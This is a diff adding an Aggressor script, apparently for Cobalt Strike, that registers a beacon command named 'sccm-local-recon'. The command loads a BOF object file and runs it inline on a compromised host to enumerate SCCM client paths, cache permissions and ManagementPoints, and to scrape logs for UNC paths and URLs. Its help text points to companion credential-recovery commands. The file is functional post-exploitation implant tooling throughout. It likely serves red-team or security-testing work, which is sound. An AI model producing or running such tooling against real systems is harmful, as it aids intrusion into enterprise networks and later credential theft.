@@ -1,0 +1,46 @@
+#
+# sccm-local-recon BOF - SCCM RECON-7 local client enumeration
+#
+# Enumerates CCM logs, ccmcache, and ccmsetup paths with per-user permissions,
+# reads the ManagementPoints registry value, and scrapes the logs for UNC paths
+# and URLs. Runs in the current user's context.
+#
+
+beacon_command_register(
+    "sccm-local-recon",
+    "Local SCCM client reconnaissance: paths, cache perms, ManagementPoints, log UNC/URLs (RECON-7)",
+    "Synopsis: sccm-local-recon\n\n" .
+    "Enumerate SCCM local client paths (CCM logs, ccmcache, ccmsetup) with\n" .
+    "per-user read/write permissions, read the ManagementPoints registry value,\n" .
+    "and scrape the CCM logs for candidate UNC paths and URLs.\n\n" .
+    "Arguments:\n" .
+    "  (none)\n\n" .
+    "Examples:\n" .
+    "  sccm-local-recon\n\n" .
+    "Notes:\n" .
+    "  - Runs in the current user's context (no SYSTEM impersonation)\n" .
+    "  - Read-only: file enumeration, registry read, and log scanning\n" .
+    "  - For credential recovery use sccm-wmi (CRED-3) or sccm-disk (CRED-4)\n"
+);
+
+sub _read_bof_resource {
+    local('$bid $arch $rel $abs $h $bytes');
+    $bid  = $1;
+    $arch = barch($bid);
+    $rel  = "sccm-local-recon." . $arch . ".o";
+    $abs  = script_resource($rel);
+    if ($abs is $null) { berror($bid, "missing resource: " . $rel); return $null; }
+    $h = openf($abs);
+    if ($h is $null) { berror($bid, "open failed: " . $abs); return $null; }
+    $bytes = readb($h, -1);
+    closef($h);
+    return $bytes;
+}
+
+alias sccm-local-recon {
+    local('$bof');
+    $bof = _read_bof_resource($1);
+    if (isnull($bof) || strlen($bof) == 0) { berror($1, "empty BOF"); return; }
+    btask($1, "Running SCCM RECON-7 BOF (local)");
+    beacon_inline_execute($1, $bof, "go", $null);   # no args
+}
